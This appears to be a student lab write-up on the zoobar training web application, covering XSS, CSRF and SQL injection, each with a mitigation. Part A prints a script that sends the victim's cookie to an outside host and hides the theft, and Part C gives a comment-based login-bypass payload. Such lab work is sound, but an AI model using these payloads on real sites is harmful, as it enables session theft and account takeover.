


# Solutions
## A
### Vulnerability
There is a XSS vulnerability in `users.php`. Particularly in this part
```html
 <input type="text" name="user" value="<?php 
   echo stripslashes($_GET['user']); 
 ?>" size=10>
 ```
 The website directly plugs a user given string (`user` parameter) to the HTML.
### Explanation
My user parameter is in this format: `"><script>....</script>`. It first closes the `value` field and then insert a new `script` block, the script block contains the following code
```javascript
var i = new Image();
i.src =
  "http://zoomail.org/sendmail.php?netid=ctseng27&payload=" +
  document.cookie +
  "&r=" +
  Math.random();
i.onerror = function () {
  window.location = window.location.pathname;
};
```
which create a new image with the `sendmail` API as the source. This causes the victim's browser to send a `GET` request along with the user's cookie as a parameter to the API and finally reload the page without any parameter so the user will not notice any malicious activity.
### Mitigation
The website should sanitize user input before inserting them to the webpage, for example, replace `>` with `&gt`.
## B
### Vulnerability
The transfer form is vulnerable to cross site request forgery (CSRF). The website will transfer zoobars without checking if the user submits the request through zoobar's website.
### Explanation
In my webpage, I create a form with identical fields found in `transfer.php` and the fields is prefilled with malicious values (send 10 zoobars to the attacker). When the victim open the page, it will automatically submit the form and redirect to bing.com.
### Mitigation
The website should introduce CSRF token in the form to ensure that all transfer requests come from zoobar's own website. On top of that, the website could also check referrer header.
## C
### Vulnerability
The website does not sanitize SQL command in some important part of the code. Specifically in `_checkLogin()` in `auth.php`
```php
$quoteduser = $this->db->quote($username);
$sql = "SELECT * FROM Person WHERE " .
       "Username = '$username' AND " .
       "Password = '$hashedpassword'";
```
Instead of the sanitized `$quoteduser`, the code uses the original `$username` instead.
### Explanation
In order to bypass the auth check, I set `$username` to `someuser'--`, so the whole SQL command will be 
```sql
SELECT * FROM Person WHERE Username = 'someuser'--' AND Password = '$hashedpassword'
```
Since the password checking part is commented out, I can access whatever user's data I want. 
However, the website check if the user exists in some previous part of the code (using proper SQL sanitization) so to successfully launch this attack, the webpage I made will automatically register the malicious username and login afterwards.
### Mitigation
The website should replace `$username` to `$quoteduser` in the `_checkLogin()` like I mentioned. But this will not be enough. The following snippet came from the `_checkRemembered()` function in the same file 
```php
$sql = "SELECT * FROM Person WHERE " .
           "(Username = '$username') AND (Token = '$token')";
```
This is also vulnerable to similar attack. So, to minimize the chance of introducing SQL injection vulnerabilities, the developers should use parameterized SQL queries, e.g., the `prepare()` statement, instead of concatenating string manually.
